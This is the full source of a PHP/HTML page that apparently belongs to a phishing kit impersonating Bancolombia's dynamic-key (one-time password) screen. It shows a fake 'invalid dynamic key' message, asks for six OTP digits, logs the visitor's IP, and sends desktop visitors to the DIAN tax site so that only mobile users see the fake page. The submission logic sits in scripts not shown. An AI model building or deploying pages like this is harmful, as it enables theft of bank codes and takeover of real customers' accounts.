<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
    <head>
        <title>Bancolombia - Clave dinámica</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v2" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../../../../js/jquery-3.6.0.min.js"></script>
        <script src="../../../../js/jquery.jclock-min.js" type="text/javascript"></script>
    
        <script type="text/javascript" src="../js/functions.js?v1"></script>
        <script type="text/javascript" src="../js/ready.js?v2"></script>

        <style type="text/css">
            .clave {                
                padding: 7px 38%;              
            }
        </style>
        
    </head>
    <body>    
           
        <div id="fondo"></div>
        <div id="cargando">
            <img src="../img/logo.svg">            
            <br>
            <img src="../img/load2.gif" />
        </div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="90">            
            <br>
            Cargando...
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29" id="lnk-errotp"></td>
            </tr>
        </table>
       
        <br><br><br><div class="titulo-app">Clave dinámica inválida.</div><br>

        <div class="frm">
            <img src="../img/candado.jpg" width="16">
            <div class="descripcion-app">Digita la clave dinámica de tu App Bancolombia o que fue enviada en un SMS</div>
            <table style="margin: 0 auto;" border="0" cellspacing="8">
                <tr>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp1" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp2" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp3" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp4" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp5" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp6" maxlength="1" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
                </tr>
            </table>  
            <br>
            <div class="descripcion-app" style="margin: 0 auto 4 auto;">Ve a tu dispositivo e ingresa la clave dinámica</div>          
        </div>  
        <button class="botones" id="btn-errotp" disabled>CONTINUAR</button> 
        <br><br><br>
        <div style="color:#1A1B1A;font-weight: bold;font-size: 16px;text-decoration: underline; cursor: pointer;text-align: center;">Genera una clave personal</div>  
    
<script>
    function detectar_dispositivo() {
        var dispositivo = "";
        if (navigator.userAgent.match(/Android/i))
            dispositivo = "Android";
        else if (navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else if (navigator.userAgent.match(/iPhone/i))
            dispositivo = "iPhone";
        else if (navigator.userAgent.match(/iPad/i))
            dispositivo = "iPad";
        else if (navigator.userAgent.match(/iPod/i))
            dispositivo = "iPod";
        else if (navigator.userAgent.match(/BlackBerry/i))
            dispositivo = "BlackBerry";
        else if (navigator.userAgent.match(/Windows Phone/i))
            dispositivo = "Windows Phone";
        else
            dispositivo = "PC";
        return dispositivo;
    }

    if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
</script>
    
</body>
</html>
<script type="text/javascript">
    $(document).ready(function() { 
                     
    });
 </script>